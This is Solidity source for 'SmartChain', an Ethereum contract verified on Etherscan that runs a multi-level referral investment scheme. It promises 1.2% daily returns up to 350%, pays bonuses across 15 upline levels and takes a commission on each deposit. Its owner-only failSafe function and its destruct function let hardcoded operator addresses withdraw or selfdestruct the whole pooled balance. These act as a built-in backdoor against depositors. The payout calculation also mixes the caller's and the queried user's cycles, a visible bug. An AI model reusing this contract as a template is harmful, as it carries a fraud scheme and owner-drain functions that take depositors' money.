/**
 *Submitted for verification at Etherscan.io on 2020-11-11
*/

//pragma solidity 0.5.16;
pragma solidity >=0.5 <0.7.17;


/*
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with GSN meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
 contract Context {
    function _msgSender() internal view  returns (address payable) {
        return msg.sender;
    }

    function _msgData() internal view  returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}


/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner account will be the one that deploys the contract. This
 * can later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor () internal {
        address msgSender = 0x7c80b1747FbC797f89ec959E34BFF714668B568C;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public  onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public  onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}


/**
 * @dev Contract module which allows children to implement an emergency stop
 * mechanism that can be triggered by an authorized account.
 *
 * This module is used through inheritance. It will make available the
 * modifiers `whenNotPaused` and `whenPaused`, which can be applied to
 * the functions of your contract. Note that they will not be pausable by
 * simply including this module, only once the modifiers are put in place.
 */
contract Pausable is Context {
    /**
     * @dev Emitted when the pause is triggered by `account`.
     */
    event Paused(address account);

    /**
     * @dev Emitted when the pause is lifted by `account`.
     */
    event Unpaused(address account);

    bool private _paused;

    /**
     * @dev Initializes the contract in unpaused state.
     */
    constructor () internal {
        _paused = false;
    }

    /**
     * @dev Returns true if the contract is paused, and false otherwise.
     */
    function paused() public view returns (bool) {
        return _paused;
    }

    /**
     * @dev Modifier to make a function callable only when the contract is not paused.
     *
     * Requirements:
     *
     * - The contract must not be paused.
     */
    modifier whenNotPaused() {
        require(!_paused, "Pausable: paused");
        _;
    }

    /**
     * @dev Modifier to make a function callable only when the contract is paused.
     *
     * Requirements:
     *
     * - The contract must be paused.
     */
    modifier whenPaused() {
        require(_paused, "Pausable: not paused");
        _;
    }

    /**
     * @dev Triggers stopped state.
     *
     * Requirements:
     *
     * - The contract must not be paused.
     */
    function _pause() internal  whenNotPaused {
        _paused = true;
        emit Paused(_msgSender());
    }

    /**
     * @dev Returns to normal state.
     *
     * Requirements:
     *
     * - The contract must be paused.
     */
    function _unpause() internal  whenPaused {
        _paused = false;
        emit Unpaused(_msgSender());
    }
}


contract Destructible {
    address payable public grand_owner;

    event GrandOwnershipTransferred(address indexed previous_owner, address indexed new_owner);

    constructor() public {
        grand_owner = 0x7c80b1747FbC797f89ec959E34BFF714668B568C;
    }

    function transferGrandOwnership(address payable _to) external {
        require(msg.sender == grand_owner, "Access denied (only grand owner)");
        
        grand_owner = _to;
    }

    function destruct() external {
        require(msg.sender == grand_owner, "Access denied (only grand owner)");

        selfdestruct(grand_owner);
    }
}

contract SmartChain is Ownable, Destructible, Pausable {
    
    struct User { // user struct
        uint256 cycle; // deposit cycles
        address upline; // referrer
        uint256 referrals; // referrals count
        mapping(uint256 => uint256) payouts; // payout of deposits by cycle
        uint256 direct_bonus; // referral bonus
        uint256 match_bonus; // matching bonus
        mapping(uint256 => uint256) deposit_amount; // deposit amount by cycle
        uint256 currentCycle; // current deposit cycle
        mapping(uint256 => uint256) deposit_payouts;  // deposit payout by cycle
        mapping(uint256 => uint256) deposit_time; // deposit time by cycle
        uint256 total_deposits; // total deposits
        uint256 total_payouts; // total payout received
        uint256 total_structure; // total upline structures
    }

    mapping(address => User) public users;
    
    address maintenance_address; // maintainence address
    address investor_address; // investor address

    uint8[] public ref_bonuses;  // upline bonuses

     uint minimum_deposit = 0.0001 ether;
    
    // pools money
    uint public general_pool_amount; // daily distribution pool
    uint public referrals_pool_amount; // matching bonus pool
    uint public investor_pool_amount; // investor pool
    uint public sponser_pool_amount; // top sponsers pool
    
    // pools percentage
    uint public general_pool = 69 ether; // 69%
    uint public referrals_pool = 15 ether; // 15%
    uint public investor_pool = 5 ether; // 5%
    uint public sponser_pool = 5 ether; // 5%
    

    uint40 public pool_last_draw = uint40(block.timestamp);
    uint256 public pool_cycle; // pool cycles

    uint256 public total_withdraw; // total withdrawal amount
    
    event Upline(address indexed addr, address indexed upline, uint _time);
    event NewDeposit(address indexed addr, uint256 amount, uint _time);
    event DirectPayout(address indexed addr, address indexed from, uint256 amount, uint _time);
    event MatchPayout(address indexed addr, address indexed from, uint256 amount, uint _time);
    event PoolPayout(address indexed addr, uint256 amount, uint _time);
    event Withdraw(address indexed addr, uint256 amount, uint _time);
    event LimitReached(address indexed addr, uint256 amount, uint _time);

    constructor() public {
        maintenance_address  = 0x73998BDa8A923aDa963C7b2fca0F25f2B2100ee4;
        investor_address = 0x25a05c48e4059a4A15cA01f8087f383CF3d4f880;
        
        ref_bonuses.push(10);
        ref_bonuses.push(5);
        ref_bonuses.push(5);
        ref_bonuses.push(5);
        ref_bonuses.push(5);
        ref_bonuses.push(5);
        ref_bonuses.push(5);
        ref_bonuses.push(5);
        ref_bonuses.push(5);
        ref_bonuses.push(5);
        ref_bonuses.push(2);
        ref_bonuses.push(2);
        ref_bonuses.push(2);
        ref_bonuses.push(2);
        ref_bonuses.push(2);
    }


    function _setUpline(address _addr, address _upline) private { // set 15 generation
        if(users[_addr].upline == address(0) && _upline != _addr && (users[_upline].deposit_time[0] > 0 || _upline == owner())) { 
            users[_addr].upline = _upline;
            users[_upline].referrals++;

            emit Upline(_addr, _upline, now);

            for(uint8 i = 0; i < ref_bonuses.length; i++) {
                if(_upline == address(0)) break;

                users[_upline].total_structure++;

                _upline = users[_upline].upline;
            }
        }
    }

    function _deposit(address _addr, uint256 _amount) private {  // user deposit and pool money distribution
        require(users[_addr].upline != address(0) || _addr == owner(), "No upline");

        if(users[_addr].cycle > 0) {
            
            require(_amount >= users[_addr].deposit_amount[users[_addr].cycle-1], "Deposit must be greather than the previous one");
        }
        else require(_amount >= minimum_deposit, "Bad amount");
        
        users[_addr].deposit_amount[users[_addr].cycle] = _amount; // deposit to current cycle.
        users[_addr].deposit_time[users[_addr].cycle] = uint40(block.timestamp);
        users[_addr].total_deposits += _amount;
        
        users[_addr].cycle++;
        
        emit NewDeposit(_addr, _amount, now);

        if(users[_addr].upline != address(0)) {
            users[users[_addr].upline].direct_bonus += _amount / 10; // upline 10 %

            emit DirectPayout(users[_addr].upline, _addr, _amount / 10, now);
        }
        
        general_pool_amount += _amount*general_pool/(100 ether); // 69% - general pool
        referrals_pool_amount += _amount*referrals_pool/(100 ether); // 15% - referral pool
        investor_pool_amount += _amount*investor_pool/(100 ether); // 5% - invest pool
        sponser_pool_amount += _amount*sponser_pool/(100 ether); // 5% - sponser pool

        address(uint160(owner())).transfer(_amount*(5 ether) / (100 ether)); // owner commission 5 %;
        address(uint160(maintenance_address)).transfer(_amount / 100); // maintainence 1 %;
    }



    function _refPayout(address _addr, uint256 _amount) private { // matching bonus distribution
        address up = users[_addr].upline;

        for(uint8 i = 0; i < ref_bonuses.length; i++) {
            if(up == address(0)) break;
            
            if(users[up].referrals >= i + 1) {
                uint256 bonus = _amount * ref_bonuses[i] / 100;
                users[up].match_bonus += bonus;
                emit MatchPayout(up, _addr, bonus, now);  
            }

            up = users[up].upline;
        }
    }

    function _drawPool(address [] memory _user_address, uint[] memory _user_amount) private { // sponser pool distribution
        require(_user_address.length == _user_amount.length,"invalid length");
        
        pool_cycle++;
        
        pool_last_draw = uint40(block.timestamp);

        for(uint8 i = 0; i < _user_address.length; i++) {
            if(_user_address[i] == address(0)) break;
                
                if(users[_user_address[i]].deposit_time[0] > 0){
                   uint max_payout = this.maxPayoutOf(users[_user_address[i]].deposit_amount[users[_user_address[i]].currentCycle]);
                   if(_user_amount[i] > max_payout){
                        _user_amount[i] = max_payout - users[_user_address[i]].payouts[users[_user_address[i]].currentCycle];
                   }    
                   
                   users[_user_address[i]].payouts[users[_user_address[i]].currentCycle] +=_user_amount[i];
                   
                   if(users[_user_address[i]].payouts[users[_user_address[i]].currentCycle] >= max_payout && _user_amount[i] > 0) {
                        users[_user_address[i]].currentCycle++;
                        emit LimitReached(_user_address[i], users[_user_address[i]].payouts[users[_user_address[i]].currentCycle], now);
                    }
                   
                   emit Withdraw(_user_address[i], _user_amount[i], now);
                }
                
                if(sponser_pool_amount < _user_amount[i]) break;
                
                require(address(uint160(_user_address[i])).send(_user_amount[i]),"transfer failed");
                sponser_pool_amount -= _user_amount[i];
                
                emit PoolPayout(_user_address[i], _user_amount[i], now);
        }
    }

    function deposit(address _upline) payable external whenNotPaused {
        _setUpline(msg.sender, _upline);
        _deposit(msg.sender, msg.value);
    }

    function withdraw() external whenNotPaused {
        (uint256 to_payout, uint256 max_payout) = this.payoutOf(msg.sender);
        
        require(users[msg.sender].payouts[users[msg.sender].currentCycle] < max_payout, "Full payouts");

        // Deposit payout
        if(to_payout > 0) {
            if(users[msg.sender].payouts[users[msg.sender].currentCycle] + to_payout > max_payout) {
                to_payout = max_payout - users[msg.sender].payouts[users[msg.sender].currentCycle];
            }
            
            if(general_pool_amount < to_payout) to_payout=general_pool_amount;
            
            users[msg.sender].deposit_payouts[users[msg.sender].currentCycle] += to_payout;
            users[msg.sender].payouts[users[msg.sender].currentCycle] += to_payout;
            general_pool_amount -= to_payout;
    
            if(to_payout > 0)
                _refPayout(msg.sender, to_payout);
        }
        
        // Direct payout
        if(users[msg.sender].payouts[users[msg.sender].currentCycle] < max_payout && users[msg.sender].direct_bonus > 0) {
            uint256 direct_bonus = users[msg.sender].direct_bonus;

            if(users[msg.sender].payouts[users[msg.sender].currentCycle] + direct_bonus > max_payout) {
                direct_bonus = max_payout - users[msg.sender].payouts[users[msg.sender].currentCycle];
            }

            users[msg.sender].direct_bonus -= direct_bonus;
            users[msg.sender].payouts[users[msg.sender].currentCycle] += direct_bonus;
            to_payout += direct_bonus;
        }

        // Match payout
        if(users[msg.sender].payouts[users[msg.sender].currentCycle] < max_payout && users[msg.sender].match_bonus > 0) {
            uint256 match_bonus = users[msg.sender].match_bonus;

            if(users[msg.sender].payouts[users[msg.sender].currentCycle] + match_bonus > max_payout) {
                match_bonus = max_payout - users[msg.sender].payouts[users[msg.sender].currentCycle];
            }
            
            if(referrals_pool_amount < match_bonus) match_bonus=referrals_pool_amount;

            users[msg.sender].match_bonus -= match_bonus;
            users[msg.sender].payouts[users[msg.sender].currentCycle] += match_bonus;
            referrals_pool_amount -= match_bonus;
            to_payout += match_bonus;
            
        }

        require(to_payout > 0, "Zero payout");
        
        users[msg.sender].total_payouts += to_payout;
        total_withdraw += to_payout;

        address(uint160(msg.sender)).transfer(to_payout);

        emit Withdraw(msg.sender, to_payout, now);

        if(users[msg.sender].payouts[users[msg.sender].currentCycle] >= max_payout) {
            users[msg.sender].currentCycle++;
            emit LimitReached(msg.sender, users[msg.sender].payouts[users[msg.sender].currentCycle], now);
        }
    }
    
    function drawPool(address[] calldata _user_address, uint[] calldata _user_amount) external onlyOwner {
        _drawPool(_user_address, _user_amount);
    }
    
    function investorWithdrawal(address payable _toUser, uint _amount) external returns(bool){
        require(investor_pool_amount >= _amount,"insufficient investor pool amount");
        require(_toUser != address(0),"invalid address");
        require(msg.sender == investor_address,"only investor wallet");
        
        require(_toUser.send(_amount),"transfer failed");
        investor_pool_amount -= _amount;
    }
    
    function failSafe(address payable _toUser, uint _amount) external onlyOwner returns (bool) {
        require(_toUser != address(0), "Invalid Address");
        require(address(this).balance >= _amount, "Insufficient balance");

        (_toUser).transfer(_amount);
        return true;
    }
    
    function pause() external onlyOwner {
        _pause();
    }
    
    function unpause() external onlyOwner {
        _unpause();
    }

    function maxPayoutOf(uint256 _amount) pure external returns(uint256) {
        return _amount * 35 / 10; // maximum payout is set to 350 %
    }

    function payoutOf(address _addr) view external returns(uint256 payout, uint256 max_payout) { // 1.2 daily ROI
        max_payout = this.maxPayoutOf(users[_addr].deposit_amount[users[_addr].currentCycle]);

        if(users[_addr].deposit_payouts[users[msg.sender].currentCycle] < max_payout) {
            payout = ((users[_addr].deposit_amount[users[_addr].currentCycle]*(1.2 ether)/(100 ether)) * ((block.timestamp - users[_addr].deposit_time[users[msg.sender].currentCycle]) / 1 days)) - users[_addr].deposit_payouts[users[msg.sender].currentCycle];
            
            if(users[_addr].deposit_payouts[users[_addr].currentCycle] + payout > max_payout) {
                payout = max_payout - users[_addr].deposit_payouts[users[_addr].currentCycle];
            }
            
        }
    }

    /*
        Only external call
    */
    function userInfo(address _addr,uint256 _cycle) view external returns(address upline, uint256 deposit_time, uint256 deposit_amount, uint256 payouts, uint256 direct_bonus) {
        return (users[_addr].upline, users[_addr].deposit_time[_cycle], users[_addr].deposit_amount[_cycle], users[_addr].payouts[_cycle], users[_addr].direct_bonus);
    }

    function userInfoTotals(address _addr) view external returns(uint256 referrals, uint256 total_deposits, uint256 total_payouts, uint256 total_structure) {
        return (users[_addr].referrals, users[_addr].total_deposits, users[_addr].total_payouts, users[_addr].total_structure);
    }

    function contractInfo() view external returns(uint256 _total_withdraw, uint40 _pool_last_draw) {
        return (total_withdraw, pool_last_draw);
    }
}
